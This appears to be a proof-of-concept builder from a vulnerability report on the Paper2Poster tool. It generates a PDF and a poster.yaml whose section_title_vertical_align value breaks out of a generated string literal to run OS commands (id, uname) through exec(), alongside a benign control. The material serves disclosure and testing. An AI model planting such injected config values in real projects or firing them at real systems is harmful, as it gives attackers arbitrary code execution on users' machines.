#!/usr/bin/env python3
"""Build the Paper2Poster carriers used by this report.

Layout produced (the one the upstream README and `skills/SKILL.md` document):

    <out>/paper-workspace/
    |-- paper.pdf      minimal but structurally valid 1-page PDF
    `-- poster.yaml    per-poster style override, auto-discovered next to paper.pdf

Cases
-----
evil    `section_title_vertical_align` carries a value that closes the generated
        Python string literal and evaluates arbitrary code:
        the product interpolates it into `vertical_anchor="..."` and exec()s
        the generated program.
benign  `section_title_vertical_align: "bottom"` - the value the repository
        itself ships in config/poster.yaml (negative control, only this field
        differs from the evil case).

The marker file passed with --marker is what the injected command writes; it is
never created by this script.
"""

import argparse
import hashlib
import pathlib
import sys

def build_pdf() -> bytes:
    """Assemble a minimal, structurally valid single-page PDF (correct xref)."""
    text = b"BT /F1 18 Tf 72 700 Td (Paper2Poster carrier: paper.pdf) Tj ET"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length %d >>\nstream\n" % len(text) + text + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = bytearray(b"%PDF-1.4\n")
    offsets = []
    for i, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref_pos = len(out)
    out += b"xref\n0 %d\n" % (len(objects) + 1) + b"0000000000 65535 f \n"
    for off in offsets:
        out += b"%010d 00000 n \n" % off
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objects) + 1,
        xref_pos,
    )
    return bytes(out)


def evil_yaml(marker: str) -> str:
    payload = (
        '" or __import__("os").system("id > ' + marker + '; uname -a >> ' + marker + '") or "'
    )
    return (
        "# Paper2Poster per-poster style override (lives next to paper.pdf).\n"
        "# Style: everything below is cosmetic *except* section_title_vertical_align,\n"
        "# whose value is copied verbatim into the generated PPTX program.\n"
        "main_text_font_size: 60\n"
        "section_title_font_size: 80\n"
        "section_title_vertical_align: '" + payload + "'\n"
        'section_title_symbol: "> "\n'
    )


def benign_yaml() -> str:
    return (
        "# Paper2Poster per-poster style override (lives next to paper.pdf).\n"
        "# Negative control: identical to the evil carrier except for the one field.\n"
        "main_text_font_size: 60\n"
        "section_title_font_size: 80\n"
        'section_title_vertical_align: "bottom"\n'
        'section_title_symbol: "> "\n'
    )


def sha256(path: pathlib.Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", choices=["evil", "benign"], default="evil")
    ap.add_argument("--out", required=True, help="output root; a paper-workspace/ dir is created")
    ap.add_argument("--marker", default="/tmp/p2p_marker.txt",
                    help="absolute path the injected command writes (evil case only)")
    args = ap.parse_args()

    root = pathlib.Path(args.out).expanduser().resolve()
    workspace = root / "paper-workspace"
    workspace.mkdir(parents=True, exist_ok=True)

    pdf = workspace / "paper.pdf"
    pdf.write_bytes(build_pdf())

    yml = workspace / "poster.yaml"
    yml.write_text(evil_yaml(args.marker) if args.case == "evil" else benign_yaml(), encoding="utf-8")

    if args.case == "evil":
        pathlib.Path(args.marker).unlink(missing_ok=True)

    print(f"case            : {args.case}")
    print(f"paper workspace : {workspace}")
    print(f"marker          : {args.marker} (must NOT exist yet: {pathlib.Path(args.marker).exists()})")
    for f in (pdf, yml):
        print(f"  {f.name}  {f.stat().st_size:>6} bytes  sha256={sha256(f)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
